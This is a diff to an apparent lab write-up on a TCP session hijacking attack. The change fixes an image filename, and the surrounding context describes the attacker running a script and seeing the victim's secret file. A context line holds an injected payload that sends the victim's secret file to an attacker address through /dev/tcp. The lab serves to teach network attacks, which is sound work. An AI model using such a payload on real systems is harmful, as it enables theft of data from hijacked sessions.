@@ -71,7 +71,7 @@ tcp_payload = "\rcat /home/seed/secret > /dev/tcp/10.0.2.6/9090\r"
 
 8.2. Run python script in another terminal window:
 - before and after pressing enter to run the script:
-![alt text](lab-tcp-hijack-after-enter.png "Lab tcp hijacking attack before pressing enter")
+![alt text](lab-tcp-hijack-before-enter.png "Lab tcp hijacking attack before pressing enter")
 ![alt text](lab-tcp-hijack-after-enter.png "Lab tcp hijacking attack after pressing enter")
 
 9. once the attacker pressed enter to execute the above script, if the attack is successful, the victim server's secret file will be displayed in the attacker's terminal window:
